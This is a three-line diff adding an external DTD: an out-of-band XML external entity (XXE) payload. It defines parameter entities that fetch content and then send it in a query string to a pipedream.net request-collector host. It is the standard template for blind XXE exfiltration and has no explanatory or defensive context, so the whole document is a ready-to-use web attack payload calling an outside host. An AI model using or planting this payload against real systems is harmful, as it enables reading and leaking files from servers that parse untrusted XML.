@@ -1,0 +1,3 @@
+<!ENTITY % file SYSTEM "https://en516mcx269todj.m.pipedream.net/1">
+<!ENTITY % all "<!ENTITY send SYSTEM 'https://en516mcx269todj.m.pipedream.net/2?%file;'>">
+%all;
